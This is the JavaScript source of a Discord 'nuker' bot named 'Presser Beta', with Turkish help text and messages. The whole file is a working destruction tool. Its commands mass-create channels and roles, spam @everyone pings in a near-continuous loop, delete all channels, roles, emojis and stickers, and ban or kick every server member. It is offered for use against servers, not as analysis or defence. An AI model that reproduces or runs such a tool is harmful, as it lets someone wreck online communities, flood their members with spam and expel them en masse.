/**
 * Presser Beta
 * @author 7teen
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
                                                                         
        ***** **                                                         
    ******  ***                            *                            
    **   *  * **                           **                            
    *    *  *  **                           **                            
        *  *   *                          ********           ***  ****    
    ** **  *        ***       ****    ********     ***     **** **** * 
    ** ** *        * ***     * ***  *    **       * ***     **   ****  
    ** ***        *   ***   *   ****     **      *   ***    **         
    ** ** ***    **    *** **    **      **     **    ***   **         
    ** **   ***  ********  **    **      **     ********    **         
    *  **     ** *******   **    **      **     *******     **         
        *      ** **        **    **      **     **          **         
    ****     ***  ****    * **    **      **     ****    *   ***        
    *  ********     *******   ***** **      **     *******     ***       
    *     ****        *****     ***   **             *****                
    *                                                                     
    **                                                                                                                                                                                                                                                            
                                                      
                            Beta
                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "Presser Beta", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**Presser Beta ;**
    \n**Toplu kanal oluşturma ;**
    ${prefix}mc [miktar] (metin) örn. \`${prefix}mc 5 test\`\n
    **Toplu kanal ve ping ;**
    ${prefix}cp [miktar] (metin), {mesaj} örn. \`${prefix}cp 5 test, deneme\`\n
    **Toplu rol oluşturma ;**
    ${prefix}mr [miktar] (metin) örn. \`${prefix}mr 5 test\`\n
    **Kanalları sil ;**
    ${prefix}dc\n
    **Rolleri sil ;**
    ${prefix}dr\n
    **Emojileri sil ;**
    ${prefix}de\n
    **Çıkartmaları sil (yeni) ;**
    ${prefix}ds\n
    **Toplu atma ;**
    ${prefix}mk\n
    **Toplu ban ;**
    ${prefix}mb
    `)
        .setFooter(`© Presser Beta`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("Bu aracın komutlarını kullanma yetkiniz yok.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    // Nuking Functions

    /**
     * Excessive amount of channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argüman: Toplu kanal oluşturmak istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tür Hatası: Miktar için bir sayı kullanın");
            if (amount > 500) return reject("Miktar Hatası: Maksimum sunucu kanal boyutu 500'dür | İpucu: 500'den küçük bir sayı kullanın");
            if (!channelPerms) return reject("Bot Eksik İzinler: 'KANALLARI_YÖNET'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} buradaydı`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Bulunan Hata: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Bulunan Hata: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Excessive amount of channels and mentions
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent when everyone is mentioned
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argüman: Toplu kanal oluşturmak istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tür Hatası: Miktar için bir sayı kullanın");
            if (amount > 500) return reject("Miktar Hatası: Maksimum sunucu kanal boyutu 500'dür | İpucu: 500'den küçük bir sayı kullanın");
            if (!channelPerms) return reject("Bot Eksik İzinler: 'KANALLARI_YÖNET'");
            if (!pingMessage) return reject("Belirtilmemiş Argüman: Toplu olarak bahsetmek istediğiniz mesajı belirtin");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} buradaydı`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Bulunan Hata: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Bulunan Hata: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literally not possible but lol?
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Deletes all channels in a guild
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot Eksik İzinler: 'KANALLARI_YÖNET'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Bulunan Hata: " + err)) }))
            resolve();
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argüman: Toplu rol oluşturmak istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tür Hatası: Miktar için bir sayı kullanın");
            if (!rolePerms) return reject("Bot Eksik İzinler: 'ROLLERİ_YÖNET'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Bulunan Hata: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Bulunan Hata: " + err)) })
                }
            }
        })
    }

    /**
     * Deletes all roles
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Eksik İzinler: 'ROLLERİ_YÖNET'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Bulunan Hata: " + err)) }))
        });
    }

    /**
     * Deletes all emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Eksik İzinler: 'EMOJİLERİ_VE_ETİKETLERİ_YÖNET'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Bulunan Hata: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Eksik İzinler: 'EMOJİLERİ_VE_ETİKETLERİ_YÖNET'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Bulunan Hata: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot Eksik İzinler: 'ÜYELERİ_YASAKLA'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Bulunan kullanıcı sayısı: " + arrayOfIDs.length).then((msg) => {
                setTimeout(() => {
                    msg.edit("Yasaklanıyor...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Bulunan Hata: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} yasaklandı.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot Eksik İzinler: 'ÜYELERİ_AT'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Bulunan kullanıcı sayısı: " + arrayOfIDs.length).then((msg) => {
                setTimeout(() => {
                    msg.edit("Atılıyor...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Bulunan Hata: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} atıldı.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
